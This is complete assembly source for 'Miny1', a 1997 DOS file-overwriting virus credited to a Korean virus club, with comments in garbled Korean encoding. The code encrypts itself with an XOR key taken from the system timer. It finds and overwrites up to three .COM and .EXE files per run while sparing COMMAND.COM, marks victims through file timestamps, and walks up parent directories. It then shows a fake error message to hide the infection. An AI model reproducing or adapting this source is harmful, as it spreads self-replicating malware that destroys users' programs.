;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;           Miny1.432                                        CVC #01  97/06
;
;
; ·¡Ÿq : Miny1.432
; ¹A¸b¸a : Osiris of CVC,Corea 97.06.01
; ¹·ŸA : §¡¬wºÑw ‰sÁa³a‹¡
;
; Miny1 ¤á‹aˆ¬å ¤á¸å·¡”a.
; Ìa·© Àx‹¡ Ði˜ ¯¡¯aÉQ ­¢¬÷·e ˆqµq ¯¡Ç© Ï©¶aˆa ´ô”a.
;
; ¶¥œ Miny1 ·e SVS(Seoul Virus Society)· KOV (¤a·¡œá¯a· ‹¡¬a:Knight Of Virus
; ) ˆa ¹A¸bÐ–´ö”a.
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>


 Miny1         SEGMENT PARA 'Miny1'
               assume cs:Miny1, ds:Miny1

               Org     100h
 Entry:        call    Decode                   ; ´qÑ¡ Î‰‹¡

 Encry_Start:
               Mov     byte ptr S_Find,00       ; COM ˆqµq·¥ˆa, EXE ˆqµq·¥ˆa
               mov     byte ptr Total,00        ; 3ˆ ˆqµq
               Mov     dx,offset Com_File       ; ¡¡—e COM Ìa·© ˆqµq
               mov     byte ptr Infected,00     ; ˆqµq–E ˆ•®Ÿi 0 ·a¡ Ðe”a.
               Jmp     Find_File                ; Ìa·© Àx‹¡¡ ¸ñÏa

;=================================================
; •A·¡Èá ˆt µwµb
;

 Msg           DB      'Abnormal Program Termination.',0Dh,0Ah,'$'
 Com_File      DB      '*.com',00               ; ¡¡—e COM Ìa·©
 Exe_File      DB      '*.exe',00               ; ¡¡—e EXE Ìa·©
 Total         DB      ?                        ; ˆqµq¯¡Ç¥®
 Infected      DB      ?                        ; »¡‹qŒa»¡ ˆqµq–E Ìa·©—i
 S_Find        DB      ?                        ; ˆqµq¯¡Ç¡‰¡ ·¶“e ¬wÈ
 UP            DB      '..',00                  ; ¬w¶á¡ ·¡•·

 Vir_Msg       DB ' Miny1 Virus - bug fix version   97/06/01',0Dh,0Ah
               DB ' (c) Copyleft 1997 by Osiris of CVC,Corea ',0Dh,0Ah
               DB ' CVC ? Corean Virus Club',0Dh,0Ah,'$'

               mov     bx,ds
               xor     ax,ax
               mov     ds,ax
               push    DS:[0090h]               ; Int 24h ˆt ¸á¸w
               Push    DS:[0092h]

               mov     DS:[0090h],offset NewInt24   ; Int 24h ˆa¡À‘
               mov     DS:[0092h],cs

               Push    CS                       ; cs=ds
               Pop     DS
 Find_File:
               Mov     ah,4Eh                   ; Ìa·© Àx‹¡
               Mov     cx,00100011B             ; Ìa·© ­¢¬÷
 Find:         Int     21h
               Jc      Find_EXE                 ; µAœá?
 ChkInfect:
               mov     ax, DS:[0080h+1Eh]
               cmp     ax,'OC'                  ; COMMAND.COM ·¥ˆa ?
               jz      Find_NEXT
               Mov     al, DS:[0080h+22]        ; ˆqµq µa¦ ˆñ¬a
               And     al,1Fh                   ; 62 Á¡ ·¥ˆa?
               Cmp     al,1Fh
               Jnz     InfectFile
               inc     byte ptr INFECTED        ; ˆqµq–E Ìa·©
 Find_NEXT:
               Mov     ah,4Fh                   ; ”a·q Ìa·© ˆñ¬a
               JMP     Find                     ;

 InfectFile:
               mov     ax,4301h                 ; ­¢¬÷·i ·ª‹¡/³a‹¡¡  e—e”a.
               xor     cx,cx                    ; DTA ˆa 0080h ¦Èá ¯¡¸bÐa£a¡
               mov     dx,0080h+1eh
               int     21h

               mov     ax,3d02h                 ; µ¡Ïe/³a‹¡¡ µ¡Ïe
               int     21h

               xchg    ax,bx                    ; AX µA Ð…—i ý‹¡
               mov     ax,5700h                 ; ¯¡ˆe ´è‹¡
               int     21h
               push    cx
               push    dx

               xor     ax,ax                    ; ·±·· ¯¡ˆe ´è‹¡ (´qÑ¡ÑÁ
               mov     es,ax                    ; µA ¬a¶w)
               mov     al,byte ptr ES:[046Ch]   ; 0000:046Ch
               Push    CS                       ;
               Pop     ES                       ;
               mov     Key_Value,al             ; Key_Value = ´qÑ¡Ç¡ ˆt
               call    Write_Vir                ; ¤a·¡œá¯a ³a‹¡ Ñ¡Â‰

               pop     dx                       ; ¯¡ˆe ¥¢Š
               pop     cx
               or      cx,+1Fh                  ; Á¡Ÿi 62Á¡ ¡ ¤aŽ‘
               mov     ax,5701h                 ; ¯¡ˆe ¹¡¸÷(¶¥œ ¯¡ˆe)
               int     21h

               mov     ah,3eh                   ; Ìa·© ”h‹¡
               Int     21h
               cmp     byte ptr Total,3         ; 3ˆ ˆqµq¯¡Åva?
               jz      Stop_Virus
               Inc     byte ptr Total           ; 1 »wˆa
               JMP     Find_NEXT
 Find_EXE:
               cmp     byte ptr S_Find,1        ; 01·¡¡e EXE Ìa·©•¡ ˆqµq¯¡Åv”a.
               Jnz     DX_EXE
               mov     dx, offset UP            ; ¬w¶á —¡BÉ¡Ÿ¡¡ ·¡•·
               mov     ah,3Bh
               Int     21h
               jc      Stop_Virus               ; žËa —¡BÉ¡Ÿ¡ ·¥ˆa ?
               mov     byte ptr S_Find,00       ; COM Ìa·© ¦Èá ˆqµq
               mov     dx, offset COM_File
               jmp     Find_File
 DX_EXE:
               Mov     byte ptr S_Find,01       ; EXE Ìa·©·i ˆqµq¯¡Åaœa.
               Mov     dx,offset Exe_File       ;
               Jmp     Find_File

 Stop_Virus:
               xor     ax,ax                    ; ¶¥œ Int 24h ¡ ¤aŽ‘
               mov     ds,ax
               pop     DS:[0092h]
               pop     DS:[0090h]
               Push    CS
               Pop     DS
               mov     dx, offset Msg           ; ¸÷¬w¸â·¥ µAœá¡ ˆa¸w
               cmp     byte ptr Infected,15     ; 15ˆ ˆqµq¯¡Åv·a¡e ¡A¯¡»¡
               jb      PrtMsg
               mov     dx, offset Vir_Msg
               mov     ax,0F044h                ; œ‘µA ¬wºÐ ·¶“e Ð”w ¤a·¡œá¯a·
               Int     21h                      ; »w¬w Ñ¡Â‰

 PrtMsg:       mov     ah,9                     ; ¡A¯¡»¡ Â‰b
               Int     21h

               Mov     ax,4C23h                 ; Ëb·¡Ða‰A ¹·žaˆt·i º…”a.
               int     21h

 NewInt24:                                      ; Int 24h ÀáŸ¡
               xor     al,al
               IRET

 End_Encry:

;==================================================
;   ¤a·¡œá¯a ´qÑ¡ÑÁ ¦¦…
;
 Write_Vir:    call    Decode                   ; ´qÑ¡
               mov     ah,40h                   ; ¤a·¡œá¯a ³a‹¡
               mov     dx, 100h
               mov     cx, offset Vir_END - 100h;
               Int     21h
               call    Decode                   ; ´qÑ¡ Ð¹A
               RET
 Key_Value     DB      ?

 Decode:
               mov     si, 103h                 ; ´qÑ¡ ¯¡¸b¸ñ
               mov     di,si
               mov     ah,Key_value             ; ´qÑ¡ Ç¡ˆt
               mov     cx, offset End_Encry - 103h
 E_Ing:
               lodsb                            ; ´qÑ¡ÑÁ
               xor     al,ah
               stosb
               loop    E_ing
               RET
 Vir_END:

 Miny1         ENDS
               END     Entry
